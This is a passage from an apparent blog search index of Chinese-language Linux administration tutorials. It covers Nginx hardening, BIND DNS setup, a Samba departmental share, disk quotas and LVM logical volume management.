proxy_read_timeout设置为30秒。当客户端请求在这些时间段内没有得到响应时，将会超时。</p><ul><li>3设置客户端连接保持活动的超时时间</li></ul><p>http {</p><p>  client_body_timeout 10s;</p><p>  client_header_timeout 10s;</p><p>}</p><p>client_body_timeout：该参数设置客户端向Nginx发送请求正文的超时时间。如果在该时间内客户端没有发送数据，Nginx将关闭连接。</p><p>client_header_timeout：该参数设置客户端向Nginx发送请求头的超时时间。如果在该时间内客户端没有发送请求头，Nginx将关闭连接。</p><h2 id="（9）限制HTTP请求方法"><a href="#（9）限制HTTP请求方法" class="headerlink" title="（9）限制HTTP请求方法"></a><strong>（9）限制HTTP请求方法</strong></h2><p>if ($request_method !~ ^(GET|POST)$ ) {</p><p>​return 444;</p><p>}</p><p>$request_method能获取到请求时所使用的method，应该配置只使用GET/POST方法访问，其他的method返回444</p><h2 id="（10）限制IP访问"><a href="#（10）限制IP访问" class="headerlink" title="（10）限制IP访问"></a><strong>（10）限制IP访问</strong></h2><p>location / {</p><p>​deny 192.168.1.1; #拒绝IP</p><p>​allow 192.168.1.0/24;   #允许IP</p><p>​allow 10.1.1.0/16;  #允许IP</p><p>​deny all;  #拒绝其他所有IP</p><p>}</p><h2 id="（11）删除缺省安装的无用文件"><a href="#（11）删除缺省安装的无用文件" class="headerlink" title="（11）删除缺省安装的无用文件"></a><strong>（11）删除缺省安装的无用文件</strong></h2><p>可根据实际情况删除，一般是 /var/www/html /var/www/cgi-bin 默认就是空的</p><h2 id="（12）监听地址绑定"><a href="#（12）监听地址绑定" class="headerlink" title="（12）监听地址绑定"></a><strong>（12）监听地址绑定</strong></h2><p>服务器有多个 IP 地址时，只监听提供服务的 IP 地址</p><p><img src="https://pic.imgdb.cn/item/66ac9956d9c307b7e933d57c.png"></p><p>默认设置是Listen 80监听所有地址，如果服务器只有一个IP地址可不做该项设置，如果有多个IP可以按照需要设</p><h2 id="（13）关闭-TRACE功能"><a href="#（13）关闭-TRACE功能" class="headerlink" title="（13）关闭 TRACE功能"></a><strong>（13）关闭 TRACE功能</strong></h2><p>关闭TRACE，防止TRACE方法被访问者恶意利用</p><p>server { </p><p>​  … </p><p>  location / { </p><pre><code>    ... </code></pre><p>​    # 禁用 TRACE 方法 </p><p>​    if ($request_method = TRACE) { </p><p>​      return 444; </p><p>​    } </p><p>  } </p><p>}</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx的安全加固 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS服务器配置</title>
      <link href="/2024/07/31/dns-fu-wu-qi-pei-zhi/"/>
      <url>/2024/07/31/dns-fu-wu-qi-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="DNS服务器配置"><a href="#DNS服务器配置" class="headerlink" title="DNS服务器配置"></a>DNS服务器配置</h1><h2 id="DNS的查询流程"><a href="#DNS的查询流程" class="headerlink" title="DNS的查询流程"></a>DNS的查询流程</h2><ol><li><p>先查看本机的/etc/hosts </p></li><li><p>查看本地的DNS缓存服务器</p></li><li><p>查找所属域的首选DNS服务器</p></li><li><p>根域名服务器进行查询</p></li></ol><h2 id="DNS的查询规则"><a href="#DNS的查询规则" class="headerlink" title="DNS的查询规则"></a>DNS的查询规则</h2><p>递归式查询，即client向支持递归查询的DNS Server发出解析请求，则自DNS服务器不论是自身直接解析还是无法解析想根发出请求，总会由其向client返回一个结果。（老好人，会帮你一直查，查到返回给你结果）</p><p>迭代式查询，即接收client解析请求的DNS Server，若其能够解析则直接返回结果，若其不能解析将把解析请求交给其他DNS服务器，而不是自己亲自将解析过程完成。 （踢皮球，让你去找别人去得到结果）</p><h2 id="DNS记录的类型"><a href="#DNS记录的类型" class="headerlink" title="DNS记录的类型"></a>DNS记录的类型</h2><p>A：主机记录，域名向ip地址转换的记录；</p><p>PTR：反向指针记录，ip地址向域名转换的记录；</p><p>NS：代表域内的dns服务器；</p><p>MX：邮件交换记录，代表域内的邮件服务器；</p><p>CNAME：别名记录，域名的别名；</p><p>SOA：起始授权机构，start of authority用于标示域内主DNS服务器。</p><h2 id="DNS服务器的安装与配置"><a href="#DNS服务器的安装与配置" class="headerlink" title="DNS服务器的安装与配置"></a>DNS服务器的安装与配置</h2><h3 id="安装DNS并启动相关服务"><a href="#安装DNS并启动相关服务" class="headerlink" title="安装DNS并启动相关服务"></a>安装DNS并启动相关服务</h3><ol><li>安装bind程序包：</li></ol><p>​#yum install bind</p><ol start="2"><li>启动服务，DNS服务名是：named</li></ol><p>​# systemctl start named</p><h3 id="配置案例：以gok-com为例配置DNS服务器"><a href="#配置案例：以gok-com为例配置DNS服务器" class="headerlink" title="配置案例：以gok.com为例配置DNS服务器"></a>配置案例：以gok.com为例配置DNS服务器</h3><h3 id="主配置文件分析"><a href="#主配置文件分析" class="headerlink" title="主配置文件分析"></a>主配置文件分析</h3><p>​#vim /etc/named.conf<br>     listen-on port 53 { any; };//服务监听端口为53<br>     allow-query     { any; };//服务监听端口为53<br>​     include “/etc/named.rfc1912.zones”;     //一般将区域（域名）写到这个文件中，不直接写主配置文件中</p><h3 id="扩展配置文件分析"><a href="#扩展配置文件分析" class="headerlink" title="扩展配置文件分析"></a>扩展配置文件分析</h3><p>#vim /etc/named.rfc1912.zones</p><p>zone “gok.com.” IN {<br>        type master;   //区域类型：master【主要区域】   hint【根区域】 slave【备份区域】 forward【转发区域】<br>        file “gok.com.zone”;    //指定区域配置文件，存放在/var/named目录下，需要手动创建<br>        allow-update { none; };  //不允许客户端更新<br>};</p><h3 id="区域配置文件分析"><a href="#区域配置文件分析" class="headerlink" title="区域配置文件分析"></a>区域配置文件分析</h3><p>#cd /var/named<br>#cp named.localhost  gok.com.zone//复制一个模板来进行更改<br>#vim gok.com.zone //编辑区域配置文件<br>$TTL 1D //更新为最长1天<br>@       IN SOA    gok.com**.**    root.gok.com**.** (<br>                                                                              0       ; serial<br>                                                                            1D      ; refresh<br>                                                                            1H      ; retry<br>                                                                            1W      ; expire<br>                                                                            3H )    ; minimum<br>            NS      dns.gok.com**.**<br>dns       A       192.168.10.1<br>www     A       192.168.10.1</p><h3 id="重启服务并配置防火墙允许访问"><a href="#重启服务并配置防火墙允许访问" class="headerlink" title="重启服务并配置防火墙允许访问"></a>重启服务并配置防火墙允许访问</h3><p>#systemctl restart named//重启服务</p><p>#systemctl stop firewalld //关闭防火墙</p><p>#setenforce 0 //关闭SElinux安全机制</p><h3 id="区域配置文件给予权限"><a href="#区域配置文件给予权限" class="headerlink" title="区域配置文件给予权限"></a>区域配置文件给予权限</h3><p>DNS客户端查询时是以named身份进行查询</p><p>#chown named:named gok.com.zone</p><h3 id="检查配置是否有问题"><a href="#检查配置是否有问题" class="headerlink" title="检查配置是否有问题"></a>检查配置是否有问题</h3><p>#named-checkconf   检查配置文件是否有语法错误</p><p>#named-checkzone gok.com gok.com.zone   检查区域配置文件是否有错误</p><h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><p>配置IP及DNS地址</p><p>将客户机的DNS服务器地址配置为DNS服务器的IP地址</p><p>DNS域名解析测试：使用nslookup命令测试DNS服务器</p><p>#nslookup</p><p>&gt; <a href="http://www.gok.com/">www.gok.com</a></p><p>能成功解析出对应的IP则证明DNS服务器配置成功</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS服务器配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>samba服务器</title>
      <link href="/2024/07/29/samba-fu-wu-qi/"/>
      <url>/2024/07/29/samba-fu-wu-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="samba服务器"><a href="#samba服务器" class="headerlink" title="samba服务器"></a>samba服务器</h1><blockquote><p>Samba是一款在Linux/Unix系统上实现与windows系统进行文件共享的免费开源软件。广泛应用于Unix-like与Windows之间，提供文件共享和打印机共享服务，使得不同系统之间跨平台共享资源更加便捷.Samba服务由服务端及客户端程序构成，采用的是smb/cifs网络协议。samba有两个主要的进程smbd和nmbd。smbd进程提供了文件和打印服务，而nmbd则提供了NetBIOS名称服务和浏览支持，帮助SMB客户定位服务器，处理所有基于UDP的协议。</p></blockquote><h2 id="Linux中配置samba服务器"><a href="#Linux中配置samba服务器" class="headerlink" title="Linux中配置samba服务器"></a>Linux中配置samba服务器</h2><h3 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h3><p>（1）samba服务器目录</p><p>企业数据目录：/companydata</p><p>公共目录：/companydata/public</p><p>销售部目录：/companydata/sales</p><p>技术部：/companydata/tech</p><p>（2）企业员工情况</p><p>总经理：zjl</p><p>销售部：销售部经理 xsjl 员工 xsy1、员工 xsy2</p><p>技术部：技术部经理 jsjl、员工 jsy1、员工 jsy2</p><p>（3）samba服务要求</p><p>搭建samba文件服务器，建立公共共享目录，允许所有人访问，权限为只读，为销售部和技术部分别建立单独的目录，只可以总经理和相应部门员工访问，并且公司员工禁止访问非本部门的共享目录。</p><h3 id="配置分析"><a href="#配置分析" class="headerlink" title="配置分析"></a>配置分析</h3><p>​        对于建立公共目录public字段就可以实现匿名访问，员工只能访问本部门的共享目录，禁止访问非本部门的共享目录，可以通过设置目录共享字段“browseable = no”及字段“valid users”来实现其隐藏功能和相应的访问权限。这样设置不能很好得解决同一目录多种需求的权限设置，所以需要建立独立配置文件，为每个部门建立一个组后并为每个组建立配置文件来实现隔离用户权限会比较灵活。</p><h3 id="配置实施"><a href="#配置实施" class="headerlink" title="配置实施"></a>配置实施</h3><h4 id="安装samba并启动samba服务"><a href="#安装samba并启动samba服务" class="headerlink" title="安装samba并启动samba服务"></a>安装samba并启动samba服务</h4><p># yum install -y samba samba-client </p><p># systemctl start smb.service nmb.service</p><h4 id="修改防火墙设置"><a href="#修改防火墙设置" class="headerlink" title="修改防火墙设置"></a>修改防火墙设置</h4><p>关闭selinux安全机制：setenforce 0 </p><p>关闭防火墙：systemctl stop firewalld</p><h4 id="建立各部门专用共享目录"><a href="#建立各部门专用共享目录" class="headerlink" title="建立各部门专用共享目录"></a>建立各部门专用共享目录</h4><p>#mkdir -p /companydata/public /companydata/xsb /company/jsb</p><h4 id="添加用户和组"><a href="#添加用户和组" class="headerlink" title="添加用户和组"></a>添加用户和组</h4><p># groupadd xsb//创建销售部</p><p># groupadd jsb     //创建技术部</p><p># useradd zjl//创建总经理</p><p># useradd  xsjl（xsy1/xsy2） //创建销售经理，销售成员1、2</p><p># useradd  jsjl （jsy1/jsy2）//创建技术经理，技术成员1、2</p><p># gpasswd -M xsjl,xsy1,xsy2 xsb//将销售经理，销售成员1、2加入销售部</p><p># gpasswd -M jsjl,jsy1,jsy2 jsb//技术部同理</p><h4 id="设置samba用户"><a href="#设置samba用户" class="headerlink" title="设置samba用户"></a>设置samba用户</h4><p>使用smbpasswd命令添加samba用户。</p><p># smbpasswd -a zjl</p><p>New SMB password:        输入samba用户密码</p><p>Retype new SMB password:    确认samba用户密码</p><p>Added user zjl.</p><p># smbpasswd -a xsjl</p><p># smbpasswd -a xsy1</p><p># smbpasswd -a xsy2</p><p># smbpasswd -a jsjl</p><p># smbpasswd -a jsy1</p><p># smbpasswd -a jsy2</p><p><strong>查看samba用户：pdbedit -L</strong></p><p><strong>删除samba用户：smbpasswd -x xxx</strong></p><p><strong>修改密码：smbpasswd 用户名</strong>       </p><h4 id="配置smb-conf文件"><a href="#配置smb-conf文件" class="headerlink" title="配置smb.conf文件"></a>配置smb.conf文件</h4><p># vim /etc/samba/smb.conf  具体配置如下：<br>[public]<br>        comment = public<br>        path = /companydata/public<br>        <strong>public = yes</strong>//是否公开<br>[xsb]<br>        comment = xsb//注释<br>        path = /companydata/sales<br>        <strong>guest ok = no</strong>//是否允许用户匿名访问<br>        <strong>writable = yes</strong>  //是否可写<br>        <strong>valid users = @xsb,zjl</strong>//允许指定用户访问（@代表一个组）<br>[jsb]<br>        comment=jsb<br>        path = /companydata/tech<br>        <strong>guest ok = no</strong><br>        <strong>writable = yes</strong><br>        <strong>valid users = @jsb,zjl</strong></p><p>配置完成之后，重启服务</p><p><strong># systemctl start smb.service nmb.service（或smb nmb）</strong></p><h4 id="配置文件权限"><a href="#配置文件权限" class="headerlink" title="配置文件权限"></a>配置文件权限</h4><p>（1）公共目录：/companydata/public，允许所有用户读取文件但不能修改，权限保持默认。</p><p>（2）销售部目录：/companydata/xsb和技术部目录：/companydata/tjsb只允许本部门   用户写入数据，但不能删除其他用户的数据，不允其他部门访问，但总经理可以查看   不能修改，权限设置如下：</p><p>#chown xsbjl:xsb /companydata/xsb//设置文件夹的所有者以及所有组</p><p>#chown jsbjl:jsb /companydata/jsb</p><p>#setfacl -m u:zjl:rwx /companydata/sales//给总经理一个ACL权限，再不加入部门组的情况下，访问部门文件</p><p>#setfacl -m u:zjl:rwx /companydata/tech</p><h4 id="客户端进行访问测试"><a href="#客户端进行访问测试" class="headerlink" title="客户端进行访问测试"></a>客户端进行访问测试</h4><p>在访问测试之前应该注意权限的设置,影响权限的因素有：<u><strong>共享权限，文件本身的权限，selinux安全机制</strong></u><br>    Windows客户端：\\192.168.10.129\public<br>    Linux客户端：首先安装samba-client客户端工具</p><p># smbclient -L 192.168.149.192     以服务器的root用户查看共享文件有哪些</p><p># smbclient -U xsjl -L 192.168.149.192    以samba用户查看服务器的共享文件有哪些</p><p># smbclient -U zjl //192.168.149.192/public    访问服务器共享文件</p><p>  smb: &gt;<br>  常用命令：ls    mkdir    put   get   rm </p><h2 id="Windows中配置samba服务器"><a href="#Windows中配置samba服务器" class="headerlink" title="Windows中配置samba服务器"></a>Windows中配置samba服务器</h2><p>案例2：Windows作为samba服务器（前提是你的用户必须是英文的）</p><p>（1）在Windows系统中设置一个共享目录：D:\sharefiles ,在属性中找到共享，并共享文件夹<br>（2）在Linux下安装 samba-client 客户端 </p><p>​# yum install samba-client</p><p>（3）安装 cifs-utils 软件包 </p><p>​# yum install cifs-utils</p><p>（4）在 Linux 下创建一个挂载点 </p><p>​# mkdir /mnt/Windows</p><p>（5）挂载 Windows 上的共享目录 D:\sharefiles 到 Linux 下的/mnt/Windows 目录下 </p><p>​# mount -t cifs -o username=HHHXXX //192.168.0.3/sharefiles /mnt/Windows      Enter password: ********<br>​192.168.0.3为windows的ip，并输入windows对应用户的登陆密码</p><p>（6）如果挂载成功，则可以进入/mnt/Windows 下进行相应操作。<br>（7）在Linux下/etc/fstab 文件中，加入该共享目录的挂载信息 （永久挂载）<br>       192.168.0.3/sharefiles /mnt/Windows cifs username=HHHXXX,password=**** 0 0<br>（8）到此为止，Windows 上的共享目录//192.168.0.3/sharefiles就被成功挂载到了 Linux上面了，并且 Linux 重启后，会自动挂载该目录到/mnt/Windows 目录下</p><h2 id="在Windows系统使用samba切换用户解决办法"><a href="#在Windows系统使用samba切换用户解决办法" class="headerlink" title="在Windows系统使用samba切换用户解决办法"></a>在Windows系统使用samba切换用户解决办法</h2><blockquote><p>samba是不允许一台电脑同时连接两个Linux用户的共享文件夹的</p><p>因此需要先断开之前用户的连接，然后再访问其他用户的共享文件夹</p></blockquote><p>断开方法如下：</p><p>1、win+R输入cmd打开命令行工具</p><p>2、输入net use查看当前的连接</p><p>3、可以看到一条正在链接的，地址为对应远程的内容</p><p>输入指令进行删除连接</p><p>#net use \\ip\IPC$ /delete</p>]]></content>
      
      
      <categories>
          
          <category> Linux and Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> samba服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>磁盘配额</title>
      <link href="/2024/07/23/ci-pan-pei-e/"/>
      <url>/2024/07/23/ci-pan-pei-e/</url>
      
        <content type="html"><![CDATA[<h1 id="磁盘配额"><a href="#磁盘配额" class="headerlink" title="磁盘配额"></a>磁盘配额</h1><p>quota 磁盘配额功能只在指定的文件系统（分区）内有效，未设置配额的文件系统不受限制。 </p><p>quota 针对指定的用户账号、组账号进行限制，其他用户或组不受影响。 </p><p><strong>磁盘配额可以进行两方面的限制：磁盘容量、文件数量</strong></p><h2 id="磁盘配额的限制方法"><a href="#磁盘配额的限制方法" class="headerlink" title="磁盘配额的限制方法"></a>磁盘配额的限制方法</h2><p>分为<u>软限制</u>和<u>硬限制</u>两种</p><p>软限制：在固定的宽限期（默认为 7 天）内允许暂时超过这个限制，但系统会给出警告信息</p><p>硬限制：绝对禁止用户超过该限值。</p><p>硬限制的配额值应大于相应的软限制值，否则软限制值将失效。</p><h2 id="检查是否安装了-quota-工具"><a href="#检查是否安装了-quota-工具" class="headerlink" title="检查是否安装了 quota 工具"></a>检查是否安装了 quota 工具</h2><blockquote><p>Linux 默认是安装了 quota 工具</p></blockquote><p>查看是否安装</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#rpm -qa | grep quota</span><br></pre></td></tr></tbody></table></figure><h2 id="磁盘配额-1"><a href="#磁盘配额-1" class="headerlink" title="磁盘配额"></a>磁盘配额</h2><p>以/dev/sdc1为例，先将其挂载到“/data”目录下，然后在文件系统中实现磁盘配额。</p><h3 id="预先准备"><a href="#预先准备" class="headerlink" title="预先准备"></a>预先准备</h3><p>首先，先将硬盘分区</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk /dev/sdc</span><br></pre></td></tr></tbody></table></figure><img src="https://pic.imgdb.cn/item/669f6b97d9c307b7e9d60aca.png" style="zoom:67%;"><p>将其文件系统更改为8e（Linux LVM）</p><p><img src="https://pic.imgdb.cn/item/669f6bfbd9c307b7e9d66d70.png"></p><p>w   write table to disk and exit</p><p><img src="https://pic.imgdb.cn/item/669f6c3cd9c307b7e9d6b70c.png"></p><p>查看硬盘总空间，发现分区成功</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l    </span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/669f6e22d9c307b7e9d8d72c.png"></p><p>格式化分区</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs -t ext4 /dev/sdc1</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/669f7010d9c307b7e9dac052.png"></p><p>挂载到/data</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sdc1 /data</span><br></pre></td></tr></tbody></table></figure><h3 id="启用quota-磁盘配额"><a href="#启用quota-磁盘配额" class="headerlink" title="启用quota 磁盘配额"></a>启用quota 磁盘配额</h3><p>修改配置文件“/etc/fstab”的方式启用 quota 磁盘配额（永久启用）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/fstab</span><br><span class="line">加入/dev/sdc1  /data   ext4           defaults,usrquota,grpquota           0     0</span><br></pre></td></tr></tbody></table></figure><p>将该文件系统重新挂载</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o remount /data</span><br></pre></td></tr></tbody></table></figure><p>查看已经挂载的文件系统，检查是否已经启用了 usrquota 和grpquota 功能</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount | grep sdc1</span><br></pre></td></tr></tbody></table></figure><h3 id="生成配额文件"><a href="#生成配额文件" class="headerlink" title="生成配额文件"></a>生成配额文件</h3><p>将 SELinux 设为许可模式</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setenforce 0</span><br></pre></td></tr></tbody></table></figure><p>然后执行quotacheck 命令</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quotacheck -cvug /data</span><br></pre></td></tr></tbody></table></figure><p>-c：不管原有的配置文件，重新扫描并建立新的配置文件<br>-v：显示扫描过程<br>-u：建立用户配额的配置文件，也就是生成 aquota.user 文件<br>-g：建立组配额的配置文件，会生成 aquota.group 文件 </p><p>查看生成的配额</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /data</span><br></pre></td></tr></tbody></table></figure><p>可以看到这三个内容 aquota.group、aquota.user、lost+found</p><h3 id="编辑用户的配额设置"><a href="#编辑用户的配额设置" class="headerlink" title="编辑用户的配额设置"></a>编辑用户的配额设置</h3><p>设置用户的zhangsan的磁盘配额</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edquota -u zhangsan</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/669f72e7d9c307b7e9de9bc4.png"></p><h3 id="激活磁盘配额"><a href="#激活磁盘配额" class="headerlink" title="激活磁盘配额"></a>激活磁盘配额</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quotaon -ugv /data</span><br></pre></td></tr></tbody></table></figure><p>-u，激活用户磁盘配额。<br>-g，激活组磁盘配额。<br>-v，显示详细信息。</p><h3 id="验证并查看磁盘配额"><a href="#验证并查看磁盘配额" class="headerlink" title="验证并查看磁盘配额"></a>验证并查看磁盘配额</h3><p>使用受配额限制的用户帐号（zhangsan）登录 Linux 系统，并向应用了配额的文件系统进行复制文件等写操作，测试所设置磁盘配额项是否有效</p><p>用 dd 命令生成指定大小的测试文件，从设备文件/dev/zero 中复制数据到/data/文件，读取 500个大小为 1MB 的数据块。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#chmod 777 /data   开放 data/的写入权限</span><br><span class="line">[zhangsan@localhost ~]# dd if=/dev/zero of=/data/文件  bs=1MB count=500</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/669f78abd9c307b7e9e3f1a7.png"></p><p>读取 550个大小为 1MB 的数据块，超出硬限制</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[zhangsan@localhost ~]# dd if=/dev/zero of=/data/文件  bs=1MB count=550</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/669f7904d9c307b7e9e43eee.png"></p><h2 id="配额复制"><a href="#配额复制" class="headerlink" title="配额复制"></a>配额复制</h2><p>tom 用户的配额值和 jerry用户完全一样，我们就可以使用 jerry用户作为模板进行复制。这样我们如果需要建立大量的配额值一致的用户时，就会非常方便，不用一个个手工建立了。复制命令如下： </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#edquota -p jerry -u tom     命令: -p 源用户 -u 目标用户 </span><br></pre></td></tr></tbody></table></figure><h2 id="关闭磁盘配额"><a href="#关闭磁盘配额" class="headerlink" title="关闭磁盘配额"></a>关闭磁盘配额</h2><p>利用 quotaoff -vug 命令关闭磁盘配额</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#quotaoff -vug /data</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 磁盘配额 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LVM逻辑卷管理</title>
      <link href="/2024/07/23/lvm-luo-ji-juan-guan-li/"/>
      <url>/2024/07/23/lvm-luo-ji-juan-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="LVM逻辑卷管理"><a href="#LVM逻辑卷管理" class="headerlink" title="LVM逻辑卷管理"></a>LVM逻辑卷管理</h1><h2 id="逻辑卷创建步骤"><a href="#逻辑卷创建步骤" class="headerlink" title="逻辑卷创建步骤"></a>逻辑卷创建步骤</h2><blockquote><p>假设我们使用sdb和sdc两个磁盘来做LVM逻辑卷。</p></blockquote><ul><li><p>第一步：建立分区并将其修改为8e(Linux LVM 文件系统)<br>  <strong>#fdisk /dev/sdb</strong><br>  命令(输入 m 获取帮助)：n   //创建分区<br>  Select (default p): p//创建主分区<br>  分区号 (1-4，默认 1)：  回车<br>  起始 扇区 (2048-4194303，默认为 2048)：回车<br>  //将使用默认值 2048<br>  Last 扇区, +扇区 or +size{K,M,G} (2048-4194303，默认为 4194303)：回车<br>  //将使用默认值 4194303<br>  分区 1 已设置为 Linux 类型，大小设为 2 GiB<br>  命令(输入 m 获取帮助)：t     //更改文件系统类型可以用 l 查看有哪些文件系统类型<br>  已选择分区 1<br>  Hex 代码(输入 L 列出所有代码)：8e<br>  已将分区“Linux”的类型更改为“Linux LVM”</p></li><li><p>第二步：创建物理卷（PV）<br>  #pvcreate /dev/sd[bc]1 创建物理卷<br>  #pvscan     查看物理卷<br>  #pvdisplay    查看物理卷的详细信息</p></li><li><p>第三步: 创建卷组并将PV加入到卷组（VG）<br>  #vgcreate vgroup /dev/sd[bc]1        创建名为vgroup的卷组，将sdb、sdc加入卷组<br>  #vgscan查看卷组<br>  #vgdisplay</p></li><li><p>第四步：建立逻辑卷FTP和WEB（LV）<br>  #lvcreate -L 2G -n WEB /dev/vgroup       创建名为WEB的逻辑卷，从卷组vgroup中分给它2G的空间<br>  #lvcreate -L 1.99G -n FTP /dev/vgroup<br>  #lvscan    查看逻辑卷<br>  #lvdisplay</p></li><li><p>第五步：格式化逻辑卷并挂载使用<br>  #mkfs -t ext4 /dev/vgroup/WEB    格式化逻辑卷选择的文件系统为ext4<br>  #mkfs -t ext4 /dev/vgroup/FTP<br>  #mount /dev/vgroup/FTP /mnt/ftp  将逻辑卷挂在到预先创建的挂载目录<br>  #mount /dev/vgroup/WEB /mnt/web</p></li></ul><h2 id="如果ftp卷已经用完了，如何进行扩展呢？"><a href="#如果ftp卷已经用完了，如何进行扩展呢？" class="headerlink" title="如果ftp卷已经用完了，如何进行扩展呢？"></a>如果ftp卷已经用完了，如何进行扩展呢？</h2><p>#vgextend vgroup /dev/sdd1   扩展vg卷组，/dev/sdd为将要加入卷组的物理卷<br>#vgdisplay<br>#lvresize -L +2G /dev/vgroup/FTP  将逻辑卷扩展2G<br>#resize2fs /dev/vgroup/FTP</p><h2 id="如何删除逻辑卷？"><a href="#如何删除逻辑卷？" class="headerlink" title="如何删除逻辑卷？"></a>如何删除逻辑卷？</h2><p>#删除挂载<br>[root@localhost mnt]# umount /mnt/ftp<br>[root@localhost mnt]# umount /mnt/web<br>#删除逻辑卷<br>[root@localhost mnt]# lvremove /dev/vgroup/FTP<br>Do you really want to remove active logical volume vgroup/FTP? [y/n]: y<br>  Logical volume “FTP” successfully removed<br>[root@localhost mnt]# lvremove /dev/vgroup/WEB<br>Do you really want to remove active logical volume vgroup/WEB? [y/n]: y<br>  Logical volume “WEB” successfully removed<br>#删除卷组<br>[root@localhost mnt]# vgremove /dev/vgroup<br>  Volume group “vgroup” successfully removed</p><h2 id="磁盘分区需要挂载（mount）的原因"><a href="#磁盘分区需要挂载（mount）的原因" class="headerlink" title="磁盘分区需要挂载（mount）的原因"></a>磁盘分区需要挂载（mount）的原因</h2><h3 id="1-文件系统的支持"><a href="#1-文件系统的支持" class="headerlink" title="1. 文件系统的支持"></a>1. <strong>文件系统的支持</strong></h3><ul><li><strong>文件系统的识别</strong>：每个分区中可能使用不同的文件系统（如NTFS、FAT32、ext4等）。挂载操作是操作系统识别和加载特定分区上文件系统的关键步骤。挂载过程中，操作系统会读取分区的文件系统结构，以确定如何访问其中的数据。</li><li><strong>访问控制</strong>：通过挂载，操作系统能够正确地解析文件和目录的结构，这令其能够按照文件系统的规则执行读写操作。</li></ul><h3 id="2-资源管理"><a href="#2-资源管理" class="headerlink" title="2. 资源管理"></a>2. <strong>资源管理</strong></h3><ul><li><strong>统一的资源管理</strong>：挂载机制使得操作系统能够将多个文件系统整合到一个统一的命名空间中。这样，用户和应用程序可以通过一致的路径来访问不同分区上的数据，而不需要直接与底层设备交互。</li><li><strong>管理和隔离</strong>：挂载点的设计允许操作系统在多个存储设备之间有效管理资源，同时也防止了设备之间的干扰。这样可以确保不同分区或设备的数据隔离和安全。</li></ul><h3 id="3-数据安全性"><a href="#3-数据安全性" class="headerlink" title="3. 数据安全性"></a>3. <strong>数据安全性</strong></h3><ul><li><strong>权限和安全控制</strong>：操作系统在挂载时可以设置访问权限，决定哪些用户或程序可以读取或修改特定分区上的数据。这是确保系统安全性和数据保护的重要机制。</li><li><strong>防止意外错误</strong>：如果文件系统在没有挂载的情况下直接访问，可能会导致数据损坏或读写错误，因为操作系统无法保证对数据结构的有效性和完整性。</li></ul><h3 id="4-异步和缓存机制"><a href="#4-异步和缓存机制" class="headerlink" title="4. 异步和缓存机制"></a>4. <strong>异步和缓存机制</strong></h3><ul><li><strong>优化访问速度</strong>：挂载过程允许操作系统通过使用缓存机制来优化文件的读取和写入速度。通过挂载，操作系统可以更好地管理内存和存储的使用。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" 